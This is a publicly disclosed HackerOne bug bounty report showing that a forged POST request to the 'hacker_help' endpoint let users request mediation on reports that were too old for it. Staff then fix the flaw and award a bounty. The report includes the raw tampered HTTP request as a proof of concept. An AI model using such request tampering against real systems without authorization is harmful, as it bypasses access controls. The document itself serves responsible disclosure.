title: Requesting Mediation possible on reports that are too old for mediation

profile.name: HackerOne
profile.about: Vulnerability disclosure should be safe, transparent, and rewarding.

vulnerability_information:
Hi Hackerone Team,

it is possible to request mediation for reports, that have the closedTooLongToMediate-parameter set to true,
by requesting a mediation for a new report and changing the report id to the old report.

PoC report: https://hackerone.com/reports/77834

My Request looks like:
````
POST /reports/OLD_REPORT_ID/hacker_help HTTP/1.1
Host: hackerone.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: */*
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
DNT: 1
X-CSRF-Token: VALID_TOKEN
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: https://hackerone.com/bugs?subject=user&report_id=*******&view=open&substates%5B%5D=new&substates%5B%5D=needs-more-info&substates%5B%5D=triaged&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1
Content-Length: 163
Cookie: __cfduid=d2bffe76709824599079c764e028a8bad1471178340; __Host---334ef06ec1ac7a1d1eee09dac2ac25e9a7553856
Connection: close

message=Example+Message&mediation_type=resolution
vulnerability_information_html:
Hi Hackerone Team,

it is possible to request mediation for reports, that have the closedTooLongToMediate-parameter set to true,
by requesting a mediation for a new report and changing the report id to the old report.

PoC report: https://hackerone.com/reports/77834

My Request looks like:

POST /reports/OLD_REPORT_ID/hacker_help HTTP/1.1

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0

message=Example+Message&mediation_type=resolution

activities.message:
Hi @troubleshooter,

Thank you for your report. We've successfully reproduced this issue on our end. While the security impact of this issue is quite low (all hacker mediation requests ultimately go to HackerOne, so we'd just respond saying the report is too old), it does demonstrate a disconnect between our frontend and backend validation, which should not happen in the first place.

We'll get back to you once we have a fix in place.
activities.markdown_message:
Hi @troubleshooter,

Thank you for your report. We've successfully reproduced this issue on our end. While the security impact of this issue is quite low (all hacker mediation requests ultimately go to HackerOne, so we'd just respond saying the report is too old), it does demonstrate a disconnect between our frontend and backend validation, which should not happen in the first place.

We'll get back to you once we have a fix in place.

activities.message:
Hi @troubleshooter,

A fix has been released. Can you verify whether it properly addresses the reported issue?
activities.markdown_message:
Hi @troubleshooter,

A fix has been released. Can you verify whether it properly addresses the reported issue?

activities.message: Sry i forgot to drop the request when closing burp, the issue looks fixed now!
activities.markdown_message: Sry i forgot to drop the request when closing burp, the issue looks fixed now!

activities.message: Thanks for the report, @troubleshooter! While someone exploiting this does not necessarily gain a big advantage (lowering the security implications), we still wanted to award our minimum bounty here. Thanks!
activities.markdown_message: Thanks for the report, @troubleshooter! While someone exploiting this does not necessarily gain a big advantage (lowering the security implications), we still wanted to award our minimum bounty here. Thanks!

additional_data.new_title: Requesting Mediation possible on reports that are too old for mediation

activities.message: Thanks again @troubleshooter. Would you mind publicly disclosing this report?
activities.markdown_message: Thanks again @troubleshooter. Would you mind publicly disclosing this report?

summaries.content: @troubleshooter identified a discrepancy between our frontend and backend validation. While our frontend did not allow hackers to request mediation on reports that were too old to mediate, a forged request would still be accepted by our backend due to different validation rules. While this has minor security implications, we decided to make the validations consistent and award our minimum bounty of $500 here.
summaries.content_html: @troubleshooter identified a discrepancy between our frontend and backend validation. While our frontend did not allow hackers to request mediation on reports that were too old to mediate, a forged request would still be accepted by our backend due to different validation rules. While this has minor security implications, we decided to make the validations consistent and award our minimum bounty of $500 here.
